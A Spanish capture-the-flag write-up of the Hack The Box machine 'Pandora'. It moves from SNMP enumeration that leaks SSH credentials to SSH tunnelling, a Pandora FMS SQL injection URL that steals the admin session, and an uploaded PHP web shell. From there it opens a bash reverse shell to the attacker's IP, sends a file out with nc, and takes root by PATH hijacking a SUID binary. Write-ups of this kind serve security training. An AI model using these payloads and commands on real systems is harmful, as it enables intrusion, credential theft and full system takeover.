---
title: Pandora Writeup
author: xdann1
date: 2022-05-31
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, SNMP, Port Forwarding, SQLi, PATH Hijacking, CVE, CMS, SUID]
image:
  path: ../../assets/img/commons/pandora/pandora.png
  width: 800
  height: 500
  alt: Banner Pandora
---

Máquina Easy, encontramos un puerto abierto en UDP que corre una versión sin casi seguridad, lo enumeramos hasta encontrar unas credenciales válidas para ssh, encontramos una web oculta vulnerable a SQLi en la que conseguimos una reverse shell, por último, nos aprovechamos de un binario SUID junto con un PATH Hijacking para conseguir el root.

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.11.136
PING 10.10.11.136 (10.10.11.136) 56(84) bytes of data.
64 bytes from 10.10.11.136: icmp_seq=1 ttl=63 time=36.2 ms

--- 10.10.11.136 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.212/36.212/36.212/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.
* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.10.11.136 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 00:58 CEST
Scanning 10.10.11.136 [65535 ports]
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
```

* -p22,80 > Indica los puertos que se quieren escanear, en este caso el 22 y 80
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.136 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 01:16 CEST
Nmap scan report for 10.10.11.136
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http

Empezaremos enumerando el puerto 80, primero podemos empezar enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado `Wappalyzer` o utilizando la herramienta `whatweb`.

```plaintext
❯ whatweb http://10.10.11.136/
http://10.10.11.136/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

Ahora podríamos intentar hacer un reconocimiento web con `dirsearch`, Utilizaremos fuerza bruta para enumerar rutas potenciales.

```plaintext
❯ dirsearch -u http://10.10.11.136/ -x 403
```

* -u http://10.10.11.136 > Indica la url
* -x 403 > Oculta las peticiones con un código de estado

Las rutas que hemos hallado son los siguientes:

```plaintext
Target: http://10.10.11.136/

[01:30:10] Starting: 
[01:30:27] 301 -  313B - /assets  ->  http://10.10.11.136/assets/
[01:30:27] 200 -   2KB - /assets/
[01:30:38] 200 -  33KB - /index.html
```

No tenemos nada demasiado interesante de momento. Vamos a ver si se está aplicando virtualhosting, primero vamos a intentarlo con el dominio encontrado en un correo y luego intentaremos buscar algún subdominio potencial.

Añadimos la dirección IP y el dominio en el fichero `/etc/hosts`, si volvemos a cargar la página pero esta vez usando la url `http://panda.htb` veremos la página exactamente igual, esto nos indica que no se está usando virtualhosting. 

Intentemos ver si el dominio cuenta con algún subdominio potencial utilizando la herramienta `gobuster`.

```plaintext
❯ gobuster vhost -u panda.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

* vhost > Indica que queremos enumerar subdominios
* -u panda.htb > Indica dominio desde el que se va a buscar
* -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt > Indica el diccionario que se va a utilizar

Tampoco encontramos algún subdominio que nos pueda ayudar. Ya que no estamos encontrando ninguna vía potencial de explotación podemos probar a intentar escanear con `nmap` los puertos que están utilizando el protocolo `UDP`.

```plaintext
❯ nmap -p- --open -sU --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG UDPports
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sU > Indica escaneo a los puertos con protocolo UDP
* --min-rate 5000 > Indica que quiero emitir paquetes no m  s lentos que 5000 paquetes por segundo
* -vvv > Muestra la informaci  n en pantalla a medida que se descubre
* -n > Indica que no aplique resoluci  n DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.10.11.136 > Direcci  n IP que se quiere escanear
* -oG UDP > Exporta el output a un fichero grepeable con nombre "UDPports"

Este es el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 03:20 CEST
Scanning 10.10.11.136 [65535 ports]
PORT      STATE         SERVICE         REASON
161/udp   open          snmp            udp-response ttl 63
```

Los puertos abiertos y sus servicios asocidados son:

* 161/udp > snmp

Ahora vamos a hacer un escaneo más exhaustivo sobre el puerto 161/udp

```plaintext
❯ nmap -p161 -sUV 20 10.10.11.136 -oN UDPtargeted
```

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 03:22 CEST
Nmap scan report for panda.htb (10.10.11.136)
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
```

# Busqueda de vulnerabilidades

**¿Qué es SNMP?**

`SNMP` (Simple Network Manager Protocol) es un protocolo de capa de aplicación basado en IP que intercambia información entre la administración de red y cualquier dispositivo habilitado para SNMP.

Ya sabiendo en que consiste el protocolo `SNMP` podemos intentar enumerarlo, para ello, podemos usar la herramienta `snmpwalk`, sin embargo, antes de usarla necesitamos de un parámetro del que no contamos, la `community strings`.

```plaintext
❯ snmpwalk -v 1 -c <community strings> 10.10.11.136
```

* -v 1 > Indica la versión de SNMP que se va a usar
* -c <community strings> > Indica la community string
* 10.10.11.136 > Indica que la dirección IP del equipo que queremos enumerar

En este caso la máquina víctima está corriendo la versión 1 del protocolo `SNMP`. Con unas cuantas búsquedas encontramos esta versión cuenta con poca o ninguna seguridad. `SNMP` utiliza un esquema de autenticación simple que determina quién puede leer, escribir o acceder a cierta información del `MIB` (Management Information Base). Cada nodo se identifica mediante la utilización de identificadores `OID`.

# Explotación

Para conseguir información de equipos que esten corriendo el protocolo `SNMP` tendremos que enviar una solicitud a la máquina víctima, junto con una cadena para autenticarnos. `SNMP` utiliza dos cadenas, llamadas `community strings`. La primera, la cadena `read only` es utilizada para información de solo lectura y la última, la cadena `read-write` es utilizada para modificar información.

Primero podemos probar con la cadena que viene por defecto, esta es `public`, si no funciona probaremos con fuerza bruta hasta que encontremos la cadena correcta.

```plaintext
❯ snmpwalk -v 1 -c public 10.10.11.136 > snmpenum
```

El output del escaneo es muy extenso, en específico son 6950 líneas por lo que tendremos que filtrar por palabras clave. Buscando y buscando por el archivo acabo encontrando unas credenciales. 

```plaintext
HOST-RESOURCES-MIB::hrSWRunParameters.827 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
```

Probamos las credenciales encontradas para autenticarnos contra SSH y... ¡estamos dentro!

# Post-explotación

Si intentamos leer la flag del usuario veremos que no se encuentra en el home de nuestro usuario. Vamos a buscar donde se encuentra.

```plaintext
❯ find / -name user.txt 2>/dev/null
/home/matt/user.txt
```

No podemos leer el contenido debido a que no tenemos permisos de lectura.

```plaintext
❯ ls -l user.txt 
-rw-r----- 1 root matt 33 May 29 23:28 user.txt
```

Ya que no tenemos permisos tendremos que ser capaces de convertirnos en el usuario `matt`, empezaremos enumerando los usuarios existentes a nivel de sistema por si hubiese otros usuarios.

```plaintext
❯ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

Vamos a comprobar si nuestro usuario pertenece a algún grupo interesante.

```plaintext
❯ groups daniel 
daniel : daniel
```

De momento no tenemos nada interesante, podemos probar si existe algún binario potencial con permisos SUID.

```plaintext
❯ find / -perm -u=s 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
					---SKIP---
```

¡BINGO! Tenemos un binario que nos puede ser de gran ayuda, vamos a analizarlo. Si intentamos leer o ejecutar el binario nos da que no tenemos permisos. Vamos a ver que permisos tiene asignados el binario.

```plaintext
❯ ls -l /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup
```

De nuevo nos encontramos con que tenemos que convertirnos en el usuario `matt`, así que intentemos seguir buscando.

Si leemos el archivo `/etc/hosts` nos daremos cuenta de que existe una relación entre la dirección IP de loopback y el dominio `pandora.pandora.htb`

```plaintext
❯ cat /etc/hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora
					---SKIP---
```

Gracias a esto, podemos deducir que puede existir otra página web. Las páginas web están alojadas en una ruta concreta del sistema, normalmente en `/var/www/`. Dentro de esta ruta nos encontramos con dos directorios. El primero, llamado `html` contiene la web a la que podemos acceder de forma normal y el último, llamado `pandora` parece ser una página web a la que no hemos podido acceder.

Como no tenemos acceso desde el exterior vamos a realizar un port forwarding. Primero, deberemos configurar un proxy web de tipo `SOCKS` desde el que reenviaremos todo el tráfico hasta un túnel SSH y de esta forma podremos acceder a la web que solo se puede visualizar en local de la víctima. Es importante que escogamos como tipo de proxy el `SOCKS5` y no el `SOCKS4` ya que el útlimo no admite resolución DNS.

Configuración del túnel SSH.

```plaintext
❯ ssh -D 4444 daniel@10.10.11.136
```

Configuración de proxy web utilizando la extensión de navegador `FoxyProxy`.

![Proxy web]({{ 'assets/img/commons/pandora/proxy.png' | relative_url }}){: .center-image }
_Proxy web_

Ahora simplemente introducimos el dominio encontrado y nos cargará la página.

![Web oculta]({{ 'assets/img/commons/pandora/web_oculta.png' | relative_url }}){: .center-image }
_Web oculta_

Analizando la web nos damos cuenta que en la parte inferior nos muestra la versión de `Pandora FMS`. Con una simple busqueda encontramos que esta versión es vulnerable a `SQLi` (SQL Injection) permitiendonos bypasear el login de administrador y finalmente, conseguir un `RCE` (Remote Command Execution). Más información en esta [página](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/).

Encontramos un [exploit](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated) que nos permite dumpear la base de datos y conseguir una shell interactiva. En él, se realiza una petición por metodo `GET` a la siguiente url:

```plaintext
http://pandora.pandora.htb/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```

Vamos a realizar la petición manualmente y posteriormente conseguiremos la cookie del administrador.

![Obtención cookie del administrador]({{ 'assets/img/commons/pandora/cookie.png' | relative_url }}){: .center-image }
_Obtención cookie del administrador_

Introducimos la cookie del administrador y ya seremos capaces de visualizar el panel de administración. 

![Panel de administración]({{ 'assets/img/commons/pandora/panel_administracion.png' | relative_url }}){: .center-image }
_Panel de administración_

Buscando en el panel de administración encontramos un apartado llamado `Admin tools`, en él encontramos otro subapartado llamado `File manager`, en este subapartado vamos a ser capaces de subir un archivo que nos sirva como web shell.

Web shell en php:

```php
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

![Upload WebShell]({{ 'assets/img/commons/pandora/upload_webshell.png' | relative_url }}){: .center-image }
_Upload Webshell_

Ahora entremos en la dirección en la que se encuentra nuestra web shell.

![Comprobación WebShell]({{ 'assets/img/commons/pandora/webshell.png' | relative_url }}){: .center-image }
_Comprobación Webshell_

Para hacerlo de una forma más eficaz y cómoda vamos a entablarnos una reverse shell hacia nuestro equipo. Lo primero de todo, es ponernos en escucha utilizando `netcat`.

```plaintext
❯ nc -nlvp 8080 
listening on [any] 8080 ...
```

Ya estando en escucha introducimos el siguiente comando en la web shell, es IMPORTANTE que lo introduzcamos codificado en url. Podemos utilizar páginas web como [esta](https://www.urlencoder.org/) o herramientas como `urlencode`.

```plaintext
bash -c "bash -i >& /dev/tcp/10.10.14.169/8080 0>&1"
```

Ya hemos establecido la reverse shell, ahora vamos a tratar la shell para hacerla completamente funcional.

```plaintext
❯ nc -nlvp 8080
listening on [any] 8080 ...
Connection from 10.10.11.136:45244
❯ script /dev/null -c bash
Script started, file is /dev/null
❯ CTRL + Z
[1]+ Detenido		nc -nlvp 8080
❯ stty raw -echo; fg
nc -nlvp 8080
	reset
reset: unknow terminal type unknown
Terminal type? xterm
❯ export SHELL=bash
❯ export TERM=xterm
❯ stty rows 42 columns 174
```

Vamos a comprobar con que usuario hemos entrado y los grupos a los que pertenece.

```plaintext
❯ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

Ya hemos conseguido convertirnos en el usuario `matt`, ahora tendremos que escalar hasta el usuario `root`, pero no sin antes leer la flag del usuario.

```plaintext
❯ cat user.txt
318fe6b33493c95d****************
```

Si recordamos, al principio cuando conseguimos acceder a la máquina víctima mediante el usuario `daniel` encontramos un binario con permisos SUID, sin embargo, no podiamos interactuar con el debido a que no contabamos con los permisos necesarios. Ahora, ya que nos hemos convertido en el usuario `matt` podemos interactuar con él.

Vamos a traernos el binario a nuestro equipo para poder analizarlo más comodamente.

Máquina víctima

```plaintext
nc 10.10.14.169 4040 < /usr/bin/pandora_backup
```

Nuestra equipo

```plaintext
nc -nlvp 4040 > binario
```

Ahora que ya está el binario en nuestro equipo vamos a empezar a analizarlo. No vamos a poder leerlo ya que contiene código fuente almacenado, podríamos intentar ver si hay algunas líneas legibles con el comando `strings`.

```plaintext
❯ strings binario
/lib64/ld-linux-x86-64.so.2
puts
setreuid
system
getuid
geteuid
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
Backup failed!
Check your permissions!
Backup successful!
Terminating program!
					---SKIP---
```

Podemos ver que el binario utiliza la herramienta `tar` para comprimir todos los archivos de la ruta `/var/www/pandora/pandora_console/*` al archivo comprimido `/root/.backup/pandora-backup.tar.gz`. El fallo que podemos aprovechar es que hace referencia a la herramienta `tar` de forma relativa por lo que podríamos modificar el PATH para que primero compruebe un directorio  en el que hemos creado un archivo malicioso llamado `tar` que será ejecutado. Un `PATH Hijacking` en toda regla.

```plaintext
❯ mktemp -d
/tmp/tmp.422JbdGPDX
❯ cd /tmp/tmp.422JbdGPDX
❯ touch tar
❯ chmod +x !$
chmod +x tar
❯ echo $(which bash) > tar
❯ echo $PATH 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
❯ export PATH=$(pwd):$PATH 
❯ echo $PATH
/tmp/tmp.422JbdGPDX:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
❯ pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
❯ whoami
root
❯ cat /root/root.txt
bf749c890f5c9b4b****************
```
